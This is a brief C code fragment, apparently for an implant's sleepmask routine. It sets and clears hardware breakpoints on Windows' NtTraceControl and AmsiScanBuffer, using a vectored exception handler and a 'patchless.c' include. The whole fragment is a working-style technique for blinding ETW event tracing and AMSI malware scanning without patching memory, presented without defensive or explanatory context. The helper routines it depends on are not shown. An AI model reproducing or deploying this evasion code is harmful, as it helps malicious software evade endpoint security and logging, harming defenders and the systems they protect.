
/*code snippets*/

#if _WIN64
#include "patchless.c" 
//To keep track and set handler
BOOL init = FALSE;
#endif

/* In sleepmask main function*/
{
#if _WIN64
  //Remove breakpoint
   uintptr_t etwPatchAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceControl");
   uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
   
   
   if(init == TRUE)
   {
	   set_hardware_breakpoints(etwPatchAddr, 0, FALSE, 0);
	   set_hardware_breakpoints(amsiPatchAddr, 1, FALSE, 0);
	   //RemoveVectoredExceptionHandler(exception_handler);
   }
#endif

/*code snippets*/

#if _WIN64  
   // Set breakpoint
   if (init == FALSE)
   {
   	AddVectoredExceptionHandler(1, exception_handler);
   	init = TRUE;
   }
   set_hardware_breakpoints(etwPatchAddr, 0, TRUE, 0);
   set_hardware_breakpoints(amsiPatchAddr, 1, TRUE, 0);
#endif
}
